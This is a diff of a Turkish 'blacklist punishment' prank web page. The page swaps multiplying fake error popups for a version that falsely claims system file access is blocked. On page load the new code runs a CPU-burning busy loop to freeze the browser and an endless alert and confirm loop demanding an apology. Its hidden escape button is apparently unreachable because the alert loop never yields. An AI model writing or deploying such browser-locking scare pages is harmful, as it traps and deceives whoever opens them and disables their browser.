@@ -3,140 +3,101 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Kötüsün.</title>
+    <title>KARA LİSTE - ERİŞİM REDDEDİLDİ</title>
     <style>
         body {
-            background-color: #1a1a1a;
+            background-color: #000;
             color: #ff0000;
             font-family: 'Courier New', Courier, monospace;
-            overflow: hidden; /* Taşmaları engellemek için */
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-
-        /* Pop-up Tasarımı */
-        .fake-popup {
-            position: fixed;
-            width: 280px;
-            background: #ffffff;
-            border: 4px solid #ff0000;
-            box-shadow: 10px 10px 0px #550000;
-            z-index: 1000;
-            padding: 0;
-            user-select: none;
-        }
-
-        .popup-header {
-            background: #ff0000;
-            color: white;
-            padding: 5px 10px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            font-weight: bold;
-            cursor: move;
-        }
-
-        .close-btn {
-            background: #000;
-            color: #fff;
-            border: 1px solid #fff;
-            padding: 0 8px;
-            cursor: pointer;
-            font-size: 14px;
-        }
-
-        .popup-body {
-            padding: 20px;
-            color: #000;
             text-align: center;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
         }
-
-        .apology-btn {
-            background-color: #28a745;
-            color: white;
-            border: 2px solid #1e7e34;
-            padding: 10px 20px;
-            cursor: pointer;
+        #warning {
+            font-size: 30px;
             font-weight: bold;
-            margin-top: 10px;
+            animation: blink 0.5s infinite;
         }
-
-        .apology-btn:hover {
-            background-color: #218838;
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0; }
+            100% { opacity: 1; }
         }
-
-        h1 {
-            font-size: 3rem;
-            text-shadow: 2px 2px #000;
+        .info {
+            margin-top: 20px;
+            font-size: 18px;
+            color: #ccc;
+        }
+        /* Gizli butonu sadece bilen bulur (Zortmen usulü) */
+        #apology-btn {
+            background: #222;
+            color: #555;
+            border: 1px solid #333;
+            padding: 5px;
+            cursor: pointer;
+            position: fixed;
+            bottom: 10px;
+            right: 10px;
         }
     </style>
 </head>
 <body>
 
-    <h1>KARA LİSTE CEZASI!</h1>
+    <div id="warning">KARA LİSTEDESİN!</div>
+    <div class="info">Sistem dosyalarına erişim engellendi...</div>
+    <div class="info">Gereksiz işlemler başlatılıyor (FPS: 8)...</div>
 
-    <div id="popup-container"></div>
+    <button id="apology-btn" onclick="stopPunishment()">Özür dilerim (Kurtar beni)</button>
 
     <script>
-        let popupCount = 0;
-        const container = document.getElementById('popup-container');
+        let isPunishing = true;
 
-        // Pop-up oluşturma fonksiyonu
-        function createPopup() {
-            popupCount++;
-            const id = 'popup-' + popupCount;
-            
-            const popup = document.createElement('div');
-            popup.id = id;
-            popup.className = 'fake-popup';
-            
-            // Ekranın rastgele yerlerinde çıksın (Kasma hissi için)
-            const x = Math.random() * (window.innerWidth - 300);
-            const y = Math.random() * (window.innerHeight - 200);
-            popup.style.left = x + 'px';
-            popup.style.top = y + 'px';
-
-            popup.innerHTML = `
-                <div class="popup-header">
-                    <span>SİSTEM HATASI!</span>
-                    <button class="close-btn" onclick="multiplyPopup('${id}')">X</button>
-                </div>
-                <div class="popup-body">
-                    <p>Benden hemen özür dilemelisin!</p>
-                    <button class="apology-btn" onclick="acceptApology()">Özür dilerim</button>
-                </div>
-            `;
-
-            container.appendChild(popup);
-        }
-
-        // Kapatmaya basınca 2 yeni pop-up açar
-        function multiplyPopup(id) {
-            const element = document.getElementById(id);
-            if (element) {
-                element.remove();
-                // Bir gidiyor, iki geliyor!
-                setTimeout(createPopup, 100);
-                setTimeout(createPopup, 200);
+        // 1. CEZA: Kapatılamayan Uyarı Zinciri
+        async function startAnnoyance() {
+            while (isPunishing) {
+                // X'e bastıkça veya Tamam dedikçe yeni bir tane çıkar
+                alert("KARA LİSTE CEZASI: Benden özür dileyene kadar buradasın!");
+                
+                // Kullanıcıyı bıktıracak onay kutuları
+                let response = confirm("Hata kodlarını temizlemek için özür dileyecek misin?");
+                if (response) {
+                    alert("Sözle yetmez, sağ alttaki gizli butonu bulmalısın!");
+                }
             }
         }
 
-        // Özür dilerse her şeyi temizler
-        function acceptApology() {
-            alert("Tamam, bu seferlik seni affediyorum...");
-            container.innerHTML = '';
+        // 2. CEZA: Donanım Kasma (CPU Tüketici)
+        function freezeBrowser() {
+            if (!isPunishing) return;
+            
+            // Boş döngü ile tarayıcıyı kilitler (FPS'i 10'un altına çeker)
+            let end = Date.now() + 100; // Her karede 100ms kilitler
+            while (Date.now() < end) {
+                Math.sqrt(Math.random() * 999999);
+            }
+            
+            requestAnimationFrame(freezeBrowser);
         }
 
-        // Sayfa yüklendiğinde "kasmaya" başlaması için 10 tane açar
-        window.onload = function() {
-            for(let i = 0; i < 10; i++) {
-                setTimeout(createPopup, i * 150);
-            }
+        // Kurtuluş yolu
+        function stopPunishment() {
+            isPunishing = false;
+            document.body.innerHTML = "<h1 style='color:green'>CEZA KALDIRILDI. SİSTEME GİRİŞ YAPABİLİRSİN.</h1>";
+            setTimeout(() => {
+                window.location.href = "https://zortmen.github.io"; // Ana sayfaya at
+            }, 2000);
+        }
+
+        // Sayfa yüklendiğinde ceza başlasın
+        window.onload = () => {
+            freezeBrowser();
+            // Küçük bir gecikme ile uyarı yağmuru başlar
+            setTimeout(startAnnoyance, 1000);
         };
     </script>
-
 </body>
 </html>
